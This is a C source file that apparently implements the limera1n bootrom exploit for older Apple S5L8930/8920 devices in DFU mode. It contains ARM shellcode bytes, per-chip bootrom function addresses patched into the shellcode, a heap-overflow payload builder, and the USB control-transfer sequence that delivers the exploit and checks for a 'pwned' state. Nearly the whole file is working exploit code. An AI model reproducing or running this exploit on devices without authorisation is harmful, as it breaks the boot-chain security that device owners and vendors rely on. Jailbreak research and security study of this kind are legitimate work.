#include <iousb.h>
#include <common.h>

static unsigned char payload[2048];
static unsigned int payloadLen = 0;

static unsigned char blank[2048];

static unsigned char shellcode[] = {
    0x08, 0xe0, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
    0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x79, 0x46, 0x04, 0x39,
    0x36, 0x48, 0x88, 0x42, 0x05, 0xd0, 0x36, 0x4a, 0x36, 0x4b, 0x98, 0x47,
    0x33, 0x4b, 0x01, 0x33, 0x18, 0x47, 0x35, 0x48, 0x85, 0x46, 0x01, 0x20,
    0x01, 0x21, 0x00, 0x22, 0x33, 0x4b, 0x98, 0x47, 0x00, 0x20, 0x33, 0x4b,
    0x98, 0x47, 0x33, 0x48, 0x27, 0xa1, 0x78, 0x22, 0x32, 0x4b, 0x98, 0x47,
    0x32, 0x4b, 0x33, 0x48, 0x33, 0x49, 0x98, 0x47, 0x04, 0x1c, 0x33, 0x49,
    0x08, 0x68, 0x00, 0x22, 0x0a, 0x60, 0x32, 0x4b, 0x98, 0x47, 0x00, 0x2c,
    0xf2, 0xdb, 0x2d, 0x4d, 0xff, 0xe7, 0x2c, 0x48, 0x21, 0x1c, 0x00, 0x22,
    0x2e, 0x4b, 0x98, 0x47, 0x00, 0x28, 0xe9, 0xd0, 0x28, 0x4b, 0x00, 0x93,
    0x01, 0x94, 0x04, 0x1c, 0x69, 0x46, 0x01, 0xaa, 0x00, 0xf0, 0x09, 0xf8,
    0x18, 0xb9, 0x24, 0x49, 0x00, 0x22, 0x28, 0x4b, 0x98, 0x47, 0x20, 0x1c,
    0x27, 0x4b, 0x98, 0x47, 0xd8, 0xe7, 0xf0, 0xb5, 0x5e, 0x46, 0x55, 0x46,
    0x44, 0x46, 0x70, 0xb4, 0x06, 0xaf, 0x24, 0x4c, 0x6d, 0x46, 0x2d, 0x1b,
    0xad, 0x46, 0x00, 0x23, 0x22, 0x4c, 0x2c, 0x19, 0x23, 0x60, 0x04, 0x92,
    0x05, 0x91, 0x06, 0x93, 0x0e, 0x68, 0x8a, 0x46, 0x9b, 0x46, 0x17, 0x49,
    0x88, 0x46, 0x42, 0x68, 0x8a, 0x42, 0x07, 0xdc, 0x90, 0x46, 0x20, 0x1c,
    0x31, 0x1c, 0x1b, 0x4c, 0xa0, 0x47, 0x04, 0x1c, 0x1a, 0x4b, 0x0c, 0xb1,
    0x01, 0x24, 0x1a, 0x4b, 0x18, 0x47, 0xc0, 0x46, 0x20, 0x50, 0x57, 0x4e,
    0x44, 0x3a, 0x5b, 0x6c, 0x69, 0x6d, 0x65, 0x72, 0x61, 0x31, 0x6e, 0x5d,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xd0, 0xba, 0x02, 0x00, 0xd0, 0xba,
    0x03, 0x00, 0xd0, 0xba, 0x04, 0x00, 0xd0, 0xba, 0x05, 0x00, 0xd0, 0xba,
    0x06, 0x00, 0xd0, 0xba, 0x07, 0x00, 0xd0, 0xba, 0x08, 0x00, 0xd0, 0xba,
    0x09, 0x00, 0xd0, 0xba, 0x0a, 0x00, 0xd0, 0xba, 0x0b, 0x00, 0xd0, 0xba,
    0x0c, 0x00, 0xd0, 0xba, 0x0d, 0x00, 0xd0, 0xba, 0x0e, 0x00, 0xd0, 0xba,
    0x0f, 0x00, 0xd0, 0xba, 0x10, 0x00, 0xd0, 0xba, 0x11, 0x00, 0xd0, 0xba,
    0x12, 0x00, 0xd0, 0xba, 0x13, 0x00, 0xd0, 0xba, 0x14, 0x00, 0xd0, 0xba,
    0x15, 0x00, 0xd0, 0xba
};

static unsigned int shellcodeLen = 328;

static int patch_payload(io_client_t client)
{
    int i=0;
    memset(&payload, '\0', 2048);
    
    uint32_t shellcode_address = 0x84000401;
    uint32_t exploit_lr = 0;
    
    i = 0xf4;
    if(client->devinfo.cpid == 0x8930) {
        exploit_lr = 0x8403bf9c;
        *(uint32_t*)(shellcode + i + 0x00) = 0x84039800; // RELOCATE_SHELLCODE_ADDRESS
        *(uint32_t*)(shellcode + i + 0x04) =       1024; // RELOCATE_SHELLCODE_SIZE
        *(uint32_t*)(shellcode + i + 0x08) =     0x84dc; // memmove
        *(uint32_t*)(shellcode + i + 0x0c) = 0x8403c000; // MAIN_STACK_ADDRESS
        *(uint32_t*)(shellcode + i + 0x10) =     0x4e8d; // nor_power_on
        *(uint32_t*)(shellcode + i + 0x14) =     0x690d; // nor_init
        *(uint32_t*)(shellcode + i + 0x18) = 0x8402e0e0; // gUSBSerialNumber
        *(uint32_t*)(shellcode + i + 0x1c) =     0x90c9; // strlcat
        *(uint32_t*)(shellcode + i + 0x20) =     0x4c85; // usb_wait_for_image
        *(uint32_t*)(shellcode + i + 0x24) = 0x84000000; // LOAD_ADDRESS
        *(uint32_t*)(shellcode + i + 0x28) =    0x2c000; // MAX_SIZE
        *(uint32_t*)(shellcode + i + 0x2c) = 0x8402dbcc; // gLeakingDFUBuffer
        *(uint32_t*)(shellcode + i + 0x30) =     0x3b95; // free
        *(uint32_t*)(shellcode + i + 0x34) =     0x7469; // memz_create
        *(uint32_t*)(shellcode + i + 0x38) =     0x5a5d; // jump_to
        *(uint32_t*)(shellcode + i + 0x3c) =     0x7451; // memz_destroy
        *(uint32_t*)(shellcode + i + 0x40) =       0x68; // IMAGE3_LOAD_SP_OFFSET
        *(uint32_t*)(shellcode + i + 0x44) =       0x64; // IMAGE3_LOAD_STRUCT_OFFSET
        *(uint32_t*)(shellcode + i + 0x48) =     0x412d; // image3_create_struct
        *(uint32_t*)(shellcode + i + 0x4c) =     0x46db; // image3_load_continue
        *(uint32_t*)(shellcode + i + 0x50) =     0x47db; // image3_load_fail
    } if(client->devinfo.cpid == 0x8920) {
        if(!strcmp(client->devinfo.srtg, "iBoot-359.3")){
            DEBUGLOG("[%s] oldBR", __FUNCTION__);
            exploit_lr = 0x84033fa4;
            *(uint32_t*)(shellcode + i + 0x00) = 0x84031800; // RELOCATE_SHELLCODE_ADDRESS
            *(uint32_t*)(shellcode + i + 0x04) =       1024; // RELOCATE_SHELLCODE_SIZE
            *(uint32_t*)(shellcode + i + 0x08) =     0x83d4; // memmove
            *(uint32_t*)(shellcode + i + 0x0c) = 0x84034000; // MAIN_STACK_ADDRESS
            *(uint32_t*)(shellcode + i + 0x10) =     0x43c9; // nor_power_on
            *(uint32_t*)(shellcode + i + 0x14) =     0x5ded; // nor_init
            *(uint32_t*)(shellcode + i + 0x18) = 0x84024820; // gUSBSerialNumber
            *(uint32_t*)(shellcode + i + 0x1c) =     0x8e7d; // strlcat
            *(uint32_t*)(shellcode + i + 0x20) =     0x349d; // usb_wait_for_image
            *(uint32_t*)(shellcode + i + 0x24) = 0x84000000; // LOAD_ADDRESS
            *(uint32_t*)(shellcode + i + 0x28) =    0x24000; // MAX_SIZE
            *(uint32_t*)(shellcode + i + 0x2c) = 0x84024228; // gLeakingDFUBuffer
            *(uint32_t*)(shellcode + i + 0x30) =     0x1ccd; // free
            *(uint32_t*)(shellcode + i + 0x34) =     0x1f79; // memz_create
            *(uint32_t*)(shellcode + i + 0x38) =     0x3969; // jump_to
            *(uint32_t*)(shellcode + i + 0x3c) =     0x1fa1; // memz_destroy
            *(uint32_t*)(shellcode + i + 0x40) =       0x60; // IMAGE3_LOAD_SP_OFFSET
            *(uint32_t*)(shellcode + i + 0x44) =       0x50; // IMAGE3_LOAD_STRUCT_OFFSET
            *(uint32_t*)(shellcode + i + 0x48) =     0x1fe5; // image3_create_struct
            *(uint32_t*)(shellcode + i + 0x4c) =     0x2655; // image3_load_continue
            *(uint32_t*)(shellcode + i + 0x50) =     0x277b; // image3_load_fail
        } else {
            // todo
            return -1;
        }
    } else {
        // s5l8922: todo
        return -1;
    }
    
    int heapBlockLen = 64;
    memset(&blank, '\41', heapBlockLen);
    
    *(uint32_t*)(blank + 0x00) = 0x405;
    *(uint32_t*)(blank + 0x04) = 0x101;
    *(uint32_t*)(blank + 0x08) = shellcode_address;
    *(uint32_t*)(blank + 0x0c) = exploit_lr;
    
    // copy
    for(int i=0;i<1024;i+=heapBlockLen) {
        memcpy(payload+i, blank, heapBlockLen);
        payloadLen += heapBlockLen;
    }
    memcpy(payload+1024, shellcode, shellcodeLen);
    payloadLen += shellcodeLen;
    
    return 0;
}

int limera1n(io_client_t client)
{
    IOReturn result;
    transfer_t res;
    
    if(patch_payload(client) != 0) {
        ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
        return -1;
    }
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("limera1n");
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    // io_devinfo will be lost
    result = io_reset(client);
    io_close(client);
    client = NULL;
    usleep(1000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] sending exploit payload", __FUNCTION__);
    res = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char *)payload, payloadLen);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
    if(res.wLenDone != payloadLen) {
        ERROR("[%s] ERROR: Failed to send payload", __FUNCTION__);
    }
    
    LOG_PROGRESS("[%s] sending fake data", __FUNCTION__);
    res = usb_ctrl_transfer_with_time(client, 0xA1, 1, 0x0000, 0x0000, blank, 1, 100);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
    if(res.wLenDone != 1) {
        ERROR("[%s] ERROR: Failed to send fake data", __FUNCTION__);
    }
    
    res = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 10);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone); // kIOReturnTimeout
    
    LOG_PROGRESS("[%s] executing exploit", __FUNCTION__);
    res = usb_ctrl_transfer_with_time(client, 0x21, 2, 0x0000, 0x0000, NULL, 0, 100);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone); // kIOReturnTimeout
    
    result = io_reset(client);
    io_close(client);
    client = NULL;
    usleep(1000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    res = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
    res = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
    res = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
    res = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
    
    result = io_reset(client);
    
    LOG_PROGRESS("[%s] exploit sent", __FUNCTION__);
    // end
    io_close(client);
    client = NULL;
    usleep(1000);
    get_device_time_stage(&client, 5, DEVICE_DFU, true);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    if(client->hasSerialStr == false) {
        read_serial_number(client); // For iOS 10 and lower
    }
    
    if(client->hasSerialStr != true) {
        ERROR("[%s] Serial number was not found!", __FUNCTION__);
        return -1;
    }
    
    if(client->devinfo.hasPwnd == true) {
        LOG_DONE("[%s] pwned!", __FUNCTION__);
        return 1;
    }
    
    return -1;
}
